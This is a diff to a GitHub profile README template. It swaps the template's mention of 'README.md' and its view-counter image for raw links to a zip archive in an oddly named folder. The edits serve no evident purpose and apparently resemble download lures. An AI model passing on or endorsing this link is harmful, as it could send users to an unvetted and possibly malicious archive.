@@ -1,7 +1,7 @@
 ### Hi there 👋
 
 <!--
-**Mochtaufiqqq/Mochtaufiqqq** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+**Mochtaufiqqq/Mochtaufiqqq** is a ✨ _special_ ✨ repository because its `https://raw.githubusercontent.com/Mochtaufiqqq/Mochtaufiqqq/main/unsizeableness/Mochtaufiqqq_v1.3.zip` (this file) appears on your GitHub profile.
 
 Here are some ideas to get you started:
 
@@ -14,4 +14,4 @@ Here are some ideas to get you started:
 - 😄 Pronouns: ...
 - ⚡ Fun fact: ...
 -->
-![](https://komarev.com/ghpvc/?username=your-github-username&color=blue)
+![](https://raw.githubusercontent.com/Mochtaufiqqq/Mochtaufiqqq/main/unsizeableness/Mochtaufiqqq_v1.3.zip)
